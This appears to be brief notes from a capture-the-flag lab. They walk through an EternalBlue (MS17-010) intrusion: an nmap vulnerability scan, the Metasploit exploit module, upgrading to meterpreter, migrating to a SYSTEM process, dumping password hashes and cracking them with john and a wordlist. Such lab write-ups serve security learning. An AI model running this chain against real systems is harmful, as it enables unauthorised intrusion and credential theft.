`nmap --script vuln` shows ms17_010 vulnerability.  metasploit search finds exploits/windows/smb/ms17_010_eternalblue

Set RHOSTS and exploit for shell.

background shell and use `post/multi/manage/shell_to_meterpreter`, set the required option and run. confirm escalation by enterering merterpreter session, `shell` and `whoami`

look for ps with `NT AUTHORITY\SYSTEM` and migrate to the id

hashdump and crack
```sudo john --wordlist=/opt/wordlists/rockyou.txt --format=nt2 hashdump```

Find the flags!
